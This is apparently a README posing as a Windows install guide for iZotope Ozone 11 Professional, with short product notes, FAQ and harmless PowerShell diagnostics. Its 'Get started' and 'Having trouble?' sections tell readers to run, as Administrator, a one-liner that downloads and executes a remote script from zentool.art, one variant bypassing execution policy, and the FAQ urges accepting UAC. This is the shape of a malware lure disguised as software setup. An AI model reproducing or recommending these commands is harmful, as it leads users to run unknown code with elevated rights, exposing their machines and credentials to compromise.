# iZotope Ozone 11 Professional — Windows Audio Production Guide (10 & 11)

Windows 10 & 11 · recording · audio production.

**iZotope Ozone 11 Professional** on **Windows 10 and 11** — recording and day-to-day notes for producers.

## Get started

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) if prompted
4. When the process finishes, open **iZotope Ozone 11 Professional** from Start or the desktop shortcut

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

iZotope Ozone is a mastering suite with EQ, dynamics, limiting, and loudness metering aimed at stereo and stem finalization inside a DAW. Windows producers use it on the master bus with reference tracks and true-peak aware export.

## FAQ

| Question | Answer |
| --- | --- |
| Where do I run the command? | **PowerShell as Administrator** — use the block in step 2 under **Get started**. |
| ExecutionPolicy blocked the script? | Expand **Having trouble?** above — that one-liner uses **Bypass** for the current session only. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks during step 3. |

## Features

- Multitrack editing
- Plugin chains
- Mix bus
- Preset banks
- MIDI tools
- Project saves
- Meters

## Use cases

- Recording studios
- Podcast producers
- Music courses

## Developer reference

Optional. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "iZotope-Ozone-11-Professional"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Application check (optional)**

```powershell
Get-Process -Name "Ozone*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 8 GB minimum · 16 GB recommended |
| Disk | 8 GB free space |

## Topics

`izotope-config` · `izotope-integration` · `izotope-latest` · `audio-production` · `mixing-tools` · `mastering` · `vst-plugins` · `music-software`

## License

This repository is a third-party audio usage guide. Comply with applicable software licensing and local regulations.
